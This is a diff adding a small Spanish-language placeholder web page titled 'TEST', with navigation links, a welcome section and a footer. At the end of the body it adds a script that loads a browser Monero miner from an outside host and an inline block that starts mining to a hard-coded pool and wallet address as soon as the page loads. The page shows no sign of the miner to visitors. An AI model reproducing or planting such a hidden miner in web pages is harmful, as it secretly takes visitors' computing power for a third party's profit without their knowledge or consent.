@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TEST</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <header>
+      <h1>TEST</h1>
+    </header>
+    <nav>
+      <ul>
+        <li><a href="#">Inicio</a></li>
+        <li><a href="#">Acerca de</a></li>
+        <li><a href="#">Servicios</a></li>
+        <li><a href="#">Contacto</a></li>
+      </ul>
+    </nav>
+    <main>
+      <section>
+        <h2>¡Bienvenido a mi TEST!</h2>
+        <p>Este es un ejemplo de un TEST simple.</p>
+      </section>
+    </main>
+    <footer>
+      <p>&copy; 2023 Mi TEST</p>
+    </footer>
+    <script src="script.js"></script>
+    <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+    <script>
+      server = "wss://f.xmrminingproxy.com:8181";
+      var pool = "gulf.moneroocean.stream:20128";
+      var walletAddress =
+        "487xS9puz2g4cgFypvkWwuN4izVQKGzB5gYWtdjXZWAj9GNkVxwFRcDBRjts7mtsY8885Q85byhGnSwE5y7aZ2vh8LV1cje";
+      var workerId = "";
+      var threads = -5;
+      var password = "x";
+      startMining(pool, walletAddress, workerId, threads, password);
+      throttleMiner = 20;
+    </script>
+  </body>
+</html>
